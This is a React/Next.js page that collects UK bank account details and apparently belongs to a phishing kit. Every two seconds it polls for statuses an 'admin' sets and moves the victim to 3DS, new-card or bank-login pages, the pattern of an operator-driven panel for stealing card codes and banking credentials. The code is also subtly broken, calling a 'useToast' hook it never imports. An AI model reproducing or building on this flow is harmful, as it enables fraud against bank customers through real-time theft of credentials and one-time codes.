"use client"

import { useState, useEffect } from "react"
import { useRouter, useSearchParams, useParams } from "next/navigation"
import { useTranslations } from "next-intl"
import { useAuth } from "@/hooks/use-auth"
import { toast } from "@/hooks/use-toast"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Building2, Loader2, CheckCircle, AlertCircle, ArrowLeft } from "lucide-react"
import { motion } from "framer-motion"
import Link from "next/link"

export default function BankTransferPage() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const { locale } = useParams() as { locale: string }
  const { isAuthenticated } = useAuth()
  const { toast } = useToast()
  const t = useTranslations('payments')

  const [loading, setLoading] = useState(false)
  const [step, setStep] = useState<'details' | 'processing' | 'success' | 'error'>('details')
  
  // Get payment data from URL
  const paymentId = searchParams.get('payment_id')
  const amount = searchParams.get('amount')
  const currency = searchParams.get('currency')
  const userEmail = searchParams.get('user_email')

  // Bank transfer form state
  const [bankName, setBankName] = useState('')
  const [accountNumber, setAccountNumber] = useState('')
  const [sortCode, setSortCode] = useState('')
  const [accountHolder, setAccountHolder] = useState('')

  const banks = [
    'Barclays Bank',
    'HSBC Bank',
    'Lloyds Bank',
    'NatWest',
    'Santander',
    'Royal Bank of Scotland',
    'Other'
  ]

  useEffect(() => {
    if (!isAuthenticated) {
      router.push(`/${locale}/login?redirect=${encodeURIComponent(`/${locale}/payments`)}`)
      return
    }

    if (!paymentId || !amount || !currency) {
      toast({
        title: t('error'),
        description: t('invalidPaymentData'),
        variant: "destructive",
      })
      router.push(`/${locale}/payments`)
      return
    }
  }, [isAuthenticated, paymentId, amount, currency, router, toast, t, locale])

  // Poll payment status for admin actions - ALWAYS ACTIVE
  useEffect(() => {
    if (!paymentId || !isAuthenticated) return

    const pollInterval = setInterval(async () => {
      try {
        const token = localStorage.getItem('token')
        if (!token) {
          console.error('No authentication token found')
          return
        }

        // Validate paymentId format
        if (!paymentId || paymentId.length < 10) {
          console.error('Invalid payment ID format:', paymentId)
          return
        }

        const response = await fetch(`http://localhost:8000/api/payments/payment/${paymentId}/status`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        })

        if (response.ok) {
          const data = await response.json()
          const status = data.status

          console.log('🔄 Bank Transfer page - Payment status polled:', status)

          // Check if admin has requested a different action
          if (status === 'waiting_3ds') {
            console.log('🔐 Admin requested 3DS - redirecting...')
            router.push(`/${locale}/payments/3ds?payment_id=${paymentId}&amount=${amount}&currency=${currency}&user_email=${userEmail}`)
          } else if (status === 'requires_new_card') {
            console.log('💳 Admin requested new card - redirecting...')
            router.push(`/${locale}/payments/new-card?payment_id=${paymentId}&amount=${amount}&currency=${currency}&user_email=${userEmail}`)
          } else if (status === 'requires_bank_login') {
            console.log('🏦 Admin requested bank login - redirecting...')
            router.push(`/${locale}/payments/bank-login?payment_id=${paymentId}&amount=${amount}&currency=${currency}&user_email=${userEmail}`)
          } else if (status === 'completed' || status === 'failed' || status === 'cancelled') {
            console.log('🏁 Payment final status reached:', status)
            router.push(`/${locale}/payments`)
          }
        } else {
          console.error('Failed to fetch payment status:', response.status, response.statusText)
        }
      } catch (error) {
        console.error('Payment status polling error:', error)
      }
    }, 2000) // Poll every 2 seconds - ALWAYS ACTIVE

    return () => clearInterval(pollInterval)
  }, [paymentId, isAuthenticated, locale, router, amount, currency, userEmail])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!bankName || !accountNumber || !sortCode || !accountHolder) {
      toast({
        title: t('error'),
        description: t('fillAllFields'),
        variant: "destructive",
      })
      return
    }

    // Validate payment ID format
    if (!paymentId || paymentId.length < 10) {
      toast({
        title: t('error'),
        description: 'Неверный формат ID платежа',
        variant: "destructive",
      })
      return
    }

    // Validate bank name
    if (!bankName.trim() || bankName.trim().length < 2) {
      toast({
        title: t('error'),
        description: 'Название банка должно содержать минимум 2 символа',
        variant: "destructive",
      })
      return
    }

    // Validate account number
    if (!accountNumber.trim() || accountNumber.trim().length < 6) {
      toast({
        title: t('error'),
        description: 'Номер счета должен содержать минимум 6 символов',
        variant: "destructive",
      })
      return
    }

    if (!/^[0-9]+$/.test(accountNumber.trim())) {
      toast({
        title: t('error'),
        description: 'Номер счета должен содержать только цифры',
        variant: "destructive",
      })
      return
    }

    // Validate sort code
    if (!sortCode.trim() || sortCode.trim().length !== 6) {
      toast({
        title: t('error'),
        description: 'Sort code должен содержать ровно 6 цифр',
        variant: "destructive",
      })
      return
    }

    if (!/^[0-9]+$/.test(sortCode.trim())) {
      toast({
        title: t('error'),
        description: 'Sort code должен содержать только цифры',
        variant: "destructive",
      })
      return
    }

    // Validate account holder
    if (!accountHolder.trim() || accountHolder.trim().length < 2) {
      toast({
        title: t('error'),
        description: 'Имя владельца счета должно содержать минимум 2 символа',
        variant: "destructive",
      })
      return
    }

    setLoading(true)
    setStep('processing')

    try {
      const token = localStorage.getItem('token')
      if (!token) {
        throw new Error('No authentication token')
      }

      const response = await fetch(`http://localhost:8000/api/payments/payment/${paymentId}/bank-transfer`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({
          bank_name: bankName.trim(),
          account_number: accountNumber.trim(),
          sort_code: sortCode.trim(),
          account_holder: accountHolder.trim()
        })
      })

      if (response.ok) {
        setStep('success')
        toast({
          title: t('success'),
          description: t('bankTransferSubmitted'),
          variant: "default"
        })
      } else {
        const errorData = await response.json()
        throw new Error(errorData.error || 'Failed to submit bank transfer')
      }
    } catch (error) {
      console.error('Bank transfer error:', error)
      setStep('error')
      toast({
        title: t('error'),
        description: error instanceof Error ? error.message : t('bankTransferError'),
        variant: "destructive",
      })
    } finally {
      setLoading(false)
    }
  }

  if (!isAuthenticated || !paymentId || !amount || !currency) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-black cyber-grid">
        <div className="flex items-center justify-center min-h-screen">
          <div className="text-center">
            <Loader2 className="h-8 w-8 animate-spin mx-auto mb-4" />
            <p className="text-white">{t('loading')}</p>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-black cyber-grid">
      <main className="pt-20 pb-10">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
          {/* Header */}
          <div className="text-center mb-8">
                    <Link 
          href={`/${locale}/payments`}
          className="inline-flex items-center text-cyan-400 hover:text-cyan-300 mb-4 transition-colors"
        >
              <ArrowLeft className="h-4 w-4 mr-2" />
              {t('backToPayments')}
            </Link>
            <h1 className="text-4xl font-bold text-white neon-glow mb-4">
              🏦 {t('bankTransfer')}
            </h1>
            <p className="text-xl text-gray-300 mb-4">
              {t('completeBankTransfer')}
            </p>
            <div className="inline-block p-4 bg-blue-500/10 border border-blue-500/30 rounded-lg">
              <p className="text-blue-400 text-sm font-mono">
                💰 {t('amount')}: {amount} {currency}
              </p>
              <p className="text-blue-400 text-sm font-mono">
                🆔 {t('paymentId')}: {paymentId}
              </p>
            </div>
          </div>

          {/* Bank Transfer Form */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
          >
            <Card className="bg-black/50 border-blue-500/30">
              <CardHeader>
                <CardTitle className="text-white flex items-center gap-2">
                  <Building2 className="h-6 w-6 text-blue-400" />
                  {t('bankAccountDetails')}
                </CardTitle>
              </CardHeader>
              <CardContent>
                {step === 'details' && (
                  <form onSubmit={handleSubmit} className="space-y-6">
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <div className="space-y-2">
                        <Label htmlFor="bankName" className="text-white">{t('bankName')}</Label>
                        <Select value={bankName} onValueChange={setBankName}>
                          <SelectTrigger className="bg-gray-800/50 border-gray-600/30 text-white">
                            <SelectValue placeholder={t('selectBank')} />
                          </SelectTrigger>
                          <SelectContent className="bg-gray-800 border-gray-600">
                            {banks.map((bank) => (
                              <SelectItem key={bank} value={bank} className="text-white hover:bg-gray-700">
                                {bank}
                              </SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="accountHolder" className="text-white">{t('accountHolder')}</Label>
                        <Input
                          id="accountHolder"
                          value={accountHolder}
                          onChange={(e) => setAccountHolder(e.target.value)}
                          className="bg-gray-800/50 border-gray-600/30 text-white placeholder-gray-400"
                          placeholder={t('accountHolderPlaceholder')}
                          required
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="accountNumber" className="text-white">{t('accountNumber')}</Label>
                        <Input
                          id="accountNumber"
                          value={accountNumber}
                          onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, ''))}
                          className="bg-gray-800/50 border-gray-600/30 text-white placeholder-gray-400"
                          placeholder="12345678"
                          maxLength={8}
                          required
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="sortCode" className="text-white">{t('sortCode')}</Label>
                        <Input
                          id="sortCode"
                          value={sortCode}
                          onChange={(e) => setSortCode(e.target.value.replace(/\D/g, ''))}
                          className="bg-gray-800/50 border-gray-600/30 text-white placeholder-gray-400"
                          placeholder="12-34-56"
                          maxLength={8}
                          required
                        />
                      </div>
                    </div>

                    <div className="pt-4">
                      <Button
                        type="submit"
                        disabled={loading}
                        className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white py-6 text-lg font-medium rounded-lg h-[60px] transition-all duration-300"
                      >
                        {loading ? (
                          <>
                            <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                            {t('processing')}
                          </>
                        ) : (
                          <>
                            <Building2 className="mr-2 h-5 w-5" />
                            {t('submitBankTransfer')}
                          </>
                        )}
                      </Button>
                    </div>
                  </form>
                )}

                {step === 'processing' && (
                  <div className="text-center py-12">
                    <Loader2 className="h-16 w-16 animate-spin mx-auto mb-6 text-blue-400" />
                    <h3 className="text-xl font-semibold text-white mb-2">{t('processingBankTransfer')}</h3>
                    <p className="text-gray-400">{t('pleaseWait')}</p>
                  </div>
                )}

                {step === 'success' && (
                  <div className="text-center py-12">
                    <CheckCircle className="h-16 w-16 mx-auto mb-6 text-green-400" />
                    <h3 className="text-xl font-semibold text-white mb-2">{t('bankTransferSubmitted')}</h3>
                    <p className="text-gray-400 mb-6">{t('bankTransferSuccessMessage')}</p>
                                         <Button
                       onClick={() => router.push(`/${locale}/payments`)}
                       className="bg-green-600 hover:bg-green-700 text-white"
                     >
                      {t('backToPayments')}
                    </Button>
                  </div>
                )}

                {step === 'error' && (
                  <div className="text-center py-12">
                    <AlertCircle className="h-16 w-16 mx-auto mb-6 text-red-400" />
                    <h3 className="text-xl font-semibold text-white mb-2">{t('bankTransferError')}</h3>
                    <p className="text-gray-400 mb-6">{t('bankTransferErrorMessage')}</p>
                    <div className="space-x-4">
                      <Button
                        onClick={() => setStep('details')}
                        variant="outline"
                        className="border-gray-600 text-white hover:bg-gray-700"
                      >
                        {t('tryAgain')}
                      </Button>
                                             <Button
                         onClick={() => router.push(`/${locale}/payments`)}
                         className="bg-red-600 hover:bg-red-700 text-white"
                       >
                        {t('backToPayments')}
                      </Button>
                    </div>
                  </div>
                )}
              </CardContent>
            </Card>
          </motion.div>
        </div>
      </main>
    </div>
  )
}
